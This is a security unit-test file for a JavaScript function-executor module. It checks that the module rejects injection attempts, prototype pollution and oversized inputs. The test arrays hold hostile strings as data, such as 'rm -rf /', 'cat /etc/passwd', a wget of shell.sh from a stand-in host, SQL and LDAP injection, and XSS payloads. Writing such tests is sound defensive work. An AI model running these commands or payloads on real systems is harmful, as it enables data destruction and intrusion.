/**
 * Function Executor Security Tests
 *
 * Comprehensive security testing for the Function Executor module covering:
 * 1. Function injection prevention (unknown functions, path traversal, Unicode spoofing)
 * 2. Parameter sanitization (JSON validation, prototype pollution, code injection)
 * 3. Resource exhaustion protection (concurrent limits, memory limits, execution time)
 * 4. Code injection defense (eval prevention, dynamic code blocking)
 * 5. Access control (function whitelist, permission checks)
 *
 * @module tests/unit/function-executor-security
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { FunctionExecutor } from '../../js/functions/function-executor.js';
import { SchemaRegistry } from '../../js/functions/schema-registry.js';
import { FunctionValidator } from '../../js/functions/function-validator.js';

// Mock console methods to avoid cluttering test output
const originalConsole = {
    log: console.log,
    warn: console.warn,
    error: console.error,
    info: console.info,
};

describe('Function Executor Security Tests', () => {
    let mockStreams;
    let mockAbortController;

    beforeEach(() => {
        // Mock console methods
        console.log = vi.fn();
        console.warn = vi.fn();
        console.error = vi.fn();
        console.info = vi.fn();

        // Setup mock streaming data
        mockStreams = [
            {
                artistName: 'Test Artist',
                trackName: 'Test Track',
                date: '2024-01-15',
                msPlayed: 180000,
            },
        ];

        // Setup mock AbortController
        mockAbortController = new AbortController();
        vi.resetModules();
    });

    afterEach(() => {
        // Restore console methods
        Object.assign(console, originalConsole);
    });

    // ==========================================
    // 1. Function Injection Prevention
    // ==========================================

    describe('1. Function Injection Prevention', () => {
        it('should reject unknown function names', async () => {
            const result = await FunctionExecutor.execute(
                'completely_fake_function_xyz',
                {},
                mockStreams
            );

            expect(result).toHaveProperty('error');
            expect(result.error).toContain('Unknown function');
            expect(result.error).toContain('completely_fake_function_xyz');
        });

        it('should reject function names with path traversal attempts', async () => {
            const pathTraversalAttempts = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32',
                '%2e%2e%2f',
                '%252e%252e%252f',
                '....//....//',
                '..%252f',
                'get_top_artists/../../admin',
                'get_top_artists?redirect=../../admin',
            ];

            for (const maliciousName of pathTraversalAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with null byte injection', async () => {
            const nullByteAttempts = [
                'get_top_artists\x00.exe',
                'get_top_artists\x00../../admin',
                '\x00get_top_artists',
                'get_top_\x00artists',
            ];

            for (const maliciousName of nullByteAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with Unicode spoofing attempts', async () => {
            const unicodeSpoofingAttempts = [
                // Homograph attacks (similar looking characters)
                'get_top_artists', // Greek omicron instead of 'o'
                'g\u0435t_top_artists', // Cyrillic 'e' instead of 'e'
                'get_top_artists', // Cyrillic 'a' instead of 'a'
                // Zero-width characters
                'get_top_\u200Bartists', // Zero-width space
                'get_top_\uFEFFartists', // Zero-width non-breaking space
                'get\u200Ctop_artists', // Zero-width non-joiner
                // Right-to-left override
                'get_top_\u202Eartists', // RTL override
                // Invisible characters
                'get_top_\u180Eartists', // Mongolian vowel separator
            ];

            for (const maliciousName of unicodeSpoofingAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with SQL injection patterns', async () => {
            const sqlInjectionAttempts = [
                "get_top_artists'; DROP TABLE functions; --",
                "get_top_artists' OR '1'='1",
                "get_top_artists' UNION SELECT * FROM users --",
                "get_top_artists'; EXEC xp_cmdshell('dir'); --",
                "get_top_artists' AND 1=1 --",
            ];

            for (const maliciousName of sqlInjectionAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with command injection patterns', async () => {
            const commandInjectionAttempts = [
                'get_top_artists; rm -rf /',
                'get_top_artists | cat /etc/passwd',
                'get_top_artists && curl malicious.com',
                'get_top_artists; wget malicious.com/shell.sh',
                'get_top_artists`whoami`',
                'get_top_artists$(whoami)',
            ];

            for (const maliciousName of commandInjectionAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with XSS attempts', async () => {
            const xssAttempts = [
                '<img src=x onerror=alert(1)>',
                '<script>alert(1)</script>',
                'javascript:alert(1)',
                'get_top_artists<img src=x onerror=alert(1)>',
                'get_top_artists<iframe src="javascript:alert(1)">',
            ];

            for (const maliciousName of xssAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });

        it('should reject function names with LDAP injection patterns', async () => {
            const ldapAttempts = [
                'get_top_artists*)(uid=*',
                'get_top_artists*)((objectClass=*)',
                'get_top_artists*)(|(password=*))',
            ];

            for (const maliciousName of ldapAttempts) {
                const result = await FunctionExecutor.execute(
                    maliciousName,
                    {},
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Unknown function');
            }
        });
    });

    // ==========================================
    // 2. Parameter Sanitization
    // ==========================================

    describe('2. Parameter Sanitization', () => {
        it('should reject null or undefined arguments', async () => {
            const nullResult = await FunctionExecutor.execute(
                'get_top_artists',
                null,
                mockStreams
            );

            expect(nullResult).toHaveProperty('error');
            expect(nullResult.error).toContain('Invalid arguments');

            const undefinedResult = await FunctionExecutor.execute(
                'get_top_artists',
                undefined,
                mockStreams
            );

            expect(undefinedResult).toHaveProperty('error');
            expect(undefinedResult.error).toContain('Invalid arguments');
        });

        it('should reject non-object arguments', async () => {
            const invalidArgs = [
                123,
                'string',
                true,
                [],
                () => {},
                new Date(),
            ];

            for (const invalidArg of invalidArgs) {
                const result = await FunctionExecutor.execute(
                    'get_top_artists',
                    invalidArg,
                    mockStreams
                );

                expect(result).toHaveProperty('error');
                expect(result.error).toContain('Invalid arguments');
            }
        });

        it('should prevent prototype pollution via __proto__', async () => {
            const maliciousArgs = {
                __proto__: {
                    polluted: 'true',
                },
                year: 2024,
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should not have polluted Object.prototype
            expect(Object.prototype.polluted).toBeUndefined();
            // Should execute normally
            expect(result.error).toBeUndefined();
        });

        it('should prevent prototype pollution via constructor', async () => {
            const maliciousArgs = {
                constructor: {
                    prototype: {
                        polluted: 'true',
                    },
                },
                year: 2024,
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should not have polluted Object.prototype
            expect(Object.prototype.polluted).toBeUndefined();
            // Should execute normally
            expect(result.error).toBeUndefined();
        });

        it('should sanitize JSON parsing errors in arguments', async () => {
            // Simulate arguments that might have been parsed from malicious JSON
            const maliciousArgs = {
                year: 2024,
                // Circular reference (would fail JSON.stringify)
                artist: {
                    name: 'Test',
                    self: null, // Would be set to circular reference
                },
            };
            maliciousArgs.artist.self = maliciousArgs.artist;

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should handle gracefully without crashing
            expect(result).toBeDefined();
        });

        it('should validate required parameters are present', async () => {
            // Test with missing required parameter (if schema requires one)
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                {}, // Missing year parameter
                mockStreams
            );

            // Should either execute with defaults or return validation error
            expect(result).toBeDefined();
        });

        it('should reject parameters with code injection strings', async () => {
            const codeInjectionAttempts = [
                { year: 2024, artist: '<script>alert(1)</script>' },
                { year: 2024, artist: '"; eval("malicious"); //' },
                { year: 2024, artist: '${malicious()}' },
            ];

            for (const args of codeInjectionAttempts) {
                const result = await FunctionExecutor.execute(
                    'get_top_artists',
                    args,
                    mockStreams
                );

                // Should not execute code
                expect(result).toBeDefined();
                // Arguments should be sanitized, not executed
            }
        });

        it('should handle extremely long parameter values', async () => {
            const longString = 'a'.repeat(1000000); // 1MB string
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, artist: longString },
                mockStreams
            );

            // Should handle without crashing or hanging
            expect(result).toBeDefined();
        });

        it('should handle deeply nested parameter objects', async () => {
            const createDeepObject = (depth) => {
                let obj = { value: 'end' };
                for (let i = 0; i < depth; i++) {
                    obj = { nested: obj };
                }
                return obj;
            };

            const deeplyNested = createDeepObject(1000);

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, metadata: deeplyNested },
                mockStreams
            );

            // Should handle without crashing
            expect(result).toBeDefined();
        });

        it('should handle arrays with excessive length', async () => {
            const hugeArray = new Array(100000).fill('item');

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, artists: hugeArray },
                mockStreams
            );

            // Should handle without crashing
            expect(result).toBeDefined();
        });

        it('should validate parameter types', async () => {
            // Type coercion: string number to actual number
            const result = await FunctionValidator.validateFunctionArgs(
                'get_top_artists',
                { year: '2024', limit: '10' }
            );

            expect(result.valid).toBe(true);
            expect(result.normalizedArgs.year).toBe(2024);
            expect(result.normalizedArgs.limit).toBe(10);
        });

        it('should reject invalid parameter types', async () => {
            const result = await FunctionValidator.validateFunctionArgs(
                'get_top_artists',
                { year: 'not_a_number' }
            );

            expect(result.valid).toBe(false);
            expect(result.errors.length).toBeGreaterThan(0);
        });
    });

    // ==========================================
    // 3. Resource Exhaustion Protection
    // ==========================================

    describe('3. Resource Exhaustion Protection', () => {
        it('should handle rapid successive function calls', async () => {
            const promises = [];
            const rapidCallCount = 100;

            for (let i = 0; i < rapidCallCount; i++) {
                promises.push(
                    FunctionExecutor.execute(
                        'get_top_artists',
                        { year: 2024 },
                        mockStreams
                    )
                );
            }

            const results = await Promise.all(promises);

            // All calls should complete without crashing
            expect(results).toHaveLength(rapidCallCount);
            results.forEach(result => {
                expect(result).toBeDefined();
            });
        });

        it('should respect abort signal for cancellation', async () => {
            const abortController = new AbortController();
            abortController.abort(); // Abort immediately

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                mockStreams,
                { signal: abortController.signal }
            );

            expect(result.aborted).toBe(true);
            expect(result.error).toContain('cancelled');
        });

        it('should handle mid-execution abort', async () => {
            const abortController = new AbortController();

            // Abort after 10ms
            setTimeout(() => abortController.abort(), 10);

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                mockStreams,
                { signal: abortController.signal }
            );

            // Should either complete or be aborted
            expect(result).toBeDefined();
        });

        it('should limit memory usage with large streaming datasets', async () => {
            // Create large streaming dataset
            const largeStreams = Array.from({ length: 100000 }, (_, i) => ({
                artistName: `Artist ${i % 100}`,
                trackName: `Track ${i % 1000}`,
                date: '2024-01-15',
                msPlayed: 180000,
            }));

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, limit: 10 },
                largeStreams
            );

            // Should handle large dataset without crashing
            expect(result).toBeDefined();
            expect(result.error).toBeUndefined();
        });

        it('should enforce parameter limits', async () => {
            const result = await FunctionValidator.validateFunctionArgs(
                'get_top_artists',
                { year: 2024, limit: 999999 } // Excessive limit
            );

            // Should validate and potentially clamp the limit
            expect(result).toBeDefined();
        });

        it('should handle concurrent executions without race conditions', async () => {
            const concurrentExecutions = 50;
            const promises = [];

            for (let i = 0; i < concurrentExecutions; i++) {
                promises.push(
                    FunctionExecutor.execute(
                        'get_top_artists',
                        { year: 2024, limit: 10 },
                        mockStreams
                    )
                );
            }

            const results = await Promise.all(promises);

            // All should complete successfully
            results.forEach(result => {
                expect(result).toBeDefined();
                expect(result.error).toBeUndefined();
            });
        });

        it('should prevent infinite loops in executor functions', async () => {
            // This is a defensive test - ensure executors have guards
            // In practice, this would require timeout mechanisms
            const startTime = Date.now();

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                mockStreams
            );

            const duration = Date.now() - startTime;

            // Should complete in reasonable time (< 5 seconds)
            expect(duration).toBeLessThan(5000);
            expect(result).toBeDefined();
        });
    });

    // ==========================================
    // 4. Code Injection Defense
    // ==========================================

    describe('4. Code Injection Defense', () => {
        it('should not use eval() or Function() constructor', () => {
            // Verify that the executor doesn't use dangerous patterns
            const executorSource = String(FunctionExecutor.execute);

            // Should not contain eval or Function constructor
            expect(executorSource).not.toContain('eval(');
            expect(executorSource).not.toContain('new Function(');
        });

        it('should not execute code from string parameters', async () => {
            const maliciousArgs = {
                year: 2024,
                // Try to inject code
                artist: 'test; return maliciousCode();',
                limit: '10; console.log("injected")',
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should not execute the injected code
            expect(result).toBeDefined();
            // The malicious code should not have been executed
        });

        it('should sanitize template literals in arguments', async () => {
            const maliciousArgs = {
                year: 2024,
                artist: '${process.env.SECRET}',
                limit: '${malicious()}',
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should treat as literal strings, not template literals
            expect(result).toBeDefined();
        });

        it('should prevent access to global scope via arguments', async () => {
            const maliciousArgs = {
                year: 2024,
                // Try to access global/window
                artist: {
                    toString: () => 'window.location.href',
                },
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should not execute the toString function for malicious purposes
            expect(result).toBeDefined();
        });

        it('should block attempts to access Node.js require', async () => {
            const maliciousArgs = {
                year: 2024,
                // Try to inject require call
                artist: "require('fs').readFileSync('/etc/passwd')",
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should not execute the require call
            expect(result).toBeDefined();
        });

        it('should sanitize RegExp special characters', async () => {
            const maliciousArgs = {
                year: 2024,
                // RegExp DoS patterns
                artist: '^(a+)+$',
            };

            const result = await FunctionExecutor.execute(
                'search_tracks',
                { track_name: '^(a+)+$' },
                mockStreams
            );

            // Should handle without ReDoS
            expect(result).toBeDefined();
        });

        it('should prevent HTML/JavaScript in output', async () => {
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, limit: 1 },
                mockStreams
            );

            // Output should not contain executable script tags
            if (result.top_artists && result.top_artists.length > 0) {
                const artistData = JSON.stringify(result.top_artists[0]);
                expect(artistData).not.toContain('<script>');
                expect(artistData).not.toContain('javascript:');
            }
        });
    });

    // ==========================================
    // 5. Access Control
    // ==========================================

    describe('5. Access Control', () => {
        it('should enforce function whitelist via SchemaRegistry', () => {
            // Only functions in SchemaRegistry should be executable
            const availableFunctions = SchemaRegistry.getAvailableFunctions();

            expect(availableFunctions.length).toBeGreaterThan(0);
            expect(availableFunctions).toContain('get_top_artists');
            expect(availableFunctions).not.toContain('malicious_function');
        });

        it('should reject functions not in whitelist', async () => {
            const result = await FunctionExecutor.execute(
                'unregistered_function',
                {},
                mockStreams
            );

            expect(result).toHaveProperty('error');
            expect(result.error).toContain('Unknown function');
        });

        it('should validate function schema exists before execution', async () => {
            // Try to execute a function that might not have a schema
            const hasSchema = SchemaRegistry.hasFunction('get_top_artists');

            if (hasSchema) {
                const result = await FunctionExecutor.execute(
                    'get_top_artists',
                    { year: 2024 },
                    mockStreams
                );

                expect(result).toBeDefined();
            }
        });

        it('should check function permissions based on type', async () => {
            // Template functions should execute without streams
            const templateFunctions = SchemaRegistry.getTemplateSchemas();

            if (templateFunctions.length > 0) {
                const templateFunc = templateFunctions[0].function.name;
                const result = await FunctionExecutor.execute(
                    templateFunc,
                    {},
                    [] // No streams needed for template functions
                );

                expect(result).toBeDefined();
            }
        });

        it('should validate streams for data functions', async () => {
            // Data functions require streams
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                [] // Empty streams
            );

            // Should return error about missing streams
            expect(result).toHaveProperty('error');
            expect(result.error).toContain('streaming data');
        });

        it('should validate DataQuery availability', async () => {
            // This tests that DataQuery module is available before execution
            const validation = FunctionValidator.validateDataQuery();

            expect(validation).toHaveProperty('valid');
            expect(typeof validation.valid).toBe('boolean');
        });

        it('should prevent execution of disabled functions', () => {
            // Test the enabled tools filtering
            const allSchemas = SchemaRegistry.getAllSchemas();
            const enabledSchemas = SchemaRegistry.getEnabledSchemas();

            // Enabled should be subset of all
            expect(enabledSchemas.length).toBeLessThanOrEqual(allSchemas.length);
        });

        it('should enforce argument validation before execution', async () => {
            const invalidArgs = {
                year: 'invalid_year',
                limit: 'not_a_number',
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                invalidArgs,
                mockStreams
            );

            // Should validate and reject invalid arguments
            expect(result).toBeDefined();
        });

        it('should sanitize error messages to prevent information disclosure', async () => {
            const result = await FunctionExecutor.execute(
                'fake_function',
                {},
                mockStreams
            );

            // Error message should not reveal internal paths
            if (result.error) {
                expect(result.error).not.toContain('/');
                expect(result.error).not.toContain('\\');
                expect(result.error).not.toContain('js/functions');
            }
        });

        it('should log security-relevant events', async () => {
            const consoleSpy = vi.spyOn(console, 'warn');

            await FunctionExecutor.execute(
                'malicious_function',
                {},
                mockStreams
            );

            // Should log warning about unknown function
            expect(consoleSpy).toHaveBeenCalledWith(
                expect.stringContaining('Unknown function'),
                expect.any(String),
                'malicious_function'
            );

            consoleSpy.mockRestore();
        });

        it('should handle schema validation failures gracefully', async () => {
            // Create a scenario where validation might fail
            const result = await FunctionValidator.validateFunctionArgs(
                'get_top_artists',
                { year: 'invalid', limit: 'invalid' }
            );

            expect(result).toHaveProperty('valid');
            expect(result).toHaveProperty('errors');
            expect(Array.isArray(result.errors)).toBe(true);
        });

        it('should normalize enum values case-insensitively', async () => {
            // Test enum validation with case insensitivity
            const result = await FunctionValidator.validateFunctionArgs(
                'get_top_artists',
                { year: 2024, sort_by: 'PLAYS' } // Uppercase
            );

            expect(result).toHaveProperty('normalizedArgs');
            if (result.normalizedArgs) {
                expect(result.normalizedArgs.sort_by).toBeDefined();
            }
        });

        it('should reject parameters with security-sensitive properties', async () => {
            const maliciousArgs = {
                year: 2024,
                // Try to inject security-sensitive properties
                constructor: 'malicious',
                __proto__: 'malicious',
                prototype: 'malicious',
            };

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                maliciousArgs,
                mockStreams
            );

            // Should handle without executing malicious code
            expect(result).toBeDefined();
        });

        it('should enforce timeout on long-running executions', async () => {
            const abortController = new AbortController();

            // Set a timeout
            const timeoutId = setTimeout(() => abortController.abort(), 100);

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                mockStreams,
                { signal: abortController.signal }
            );

            clearTimeout(timeoutId);

            // Should either complete or be aborted
            expect(result).toBeDefined();
        });
    });

    // ==========================================
    // 6. Integration Security Tests
    // ==========================================

    describe('6. Integration Security Tests', () => {
        it('should handle malformed streaming data', async () => {
            const malformedStreams = [
                {
                    // Missing required fields
                    date: '2024-01-15',
                },
                {
                    artistName: null,
                    trackName: undefined,
                },
                {
                    artistName: 'Test',
                    trackName: 'Test',
                    date: 'invalid-date',
                    msPlayed: 'not-a-number',
                },
            ];

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 },
                malformedStreams
            );

            // Should handle gracefully without crashing
            expect(result).toBeDefined();
        });

        it('should prevent data exfiltration via error messages', async () => {
            const result = await FunctionExecutor.execute(
                'fake_function',
                { sensitive: 'data' },
                mockStreams
            );

            // Error should not leak sensitive data
            if (result.error) {
                expect(result.error).not.toContain('sensitive');
            }
        });

        it('should handle concurrent requests with same function name', async () => {
            const promises = [];
            for (let i = 0; i < 10; i++) {
                promises.push(
                    FunctionExecutor.execute(
                        'get_top_artists',
                        { year: 2024, limit: 5 },
                        mockStreams
                    )
                );
            }

            const results = await Promise.all(promises);

            // All should complete without interference
            results.forEach(result => {
                expect(result).toBeDefined();
            });
        });

        it('should maintain isolation between executions', async () => {
            const result1 = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, limit: 5 },
                mockStreams
            );

            const result2 = await FunctionExecutor.execute(
                'get_top_tracks',
                { year: 2024, limit: 5 },
                mockStreams
            );

            // Results should be independent
            expect(result1).toBeDefined();
            expect(result2).toBeDefined();
            expect(result1).not.toBe(result2);
        });

        it('should sanitize all output before returning', async () => {
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024, limit: 5 },
                mockStreams
            );

            // Output should be serializable without circular references
            expect(() => JSON.stringify(result)).not.toThrow();
        });

        it('should handle missing or undefined optional parameters', async () => {
            const result = await FunctionExecutor.execute(
                'get_top_artists',
                { year: 2024 }, // Missing optional parameters
                mockStreams
            );

            expect(result).toBeDefined();
        });

        it('should validate parameter count limits', async () => {
            const excessiveParams = {};
            for (let i = 0; i < 1000; i++) {
                excessiveParams[`param${i}`] = `value${i}`;
            }

            const result = await FunctionExecutor.execute(
                'get_top_artists',
                excessiveParams,
                mockStreams
            );

            // Should handle excessive parameters
            expect(result).toBeDefined();
        });

        it('should prevent timing attacks through execution time', async () => {
            const startTime = Date.now();

            await FunctionExecutor.execute(
                'fake_function',
                {},
                mockStreams
            );

            const duration = Date.now() - startTime;

            // Should fail fast without revealing information through timing
            expect(duration).toBeLessThan(1000); // Should fail in < 1 second
        });
    });
});
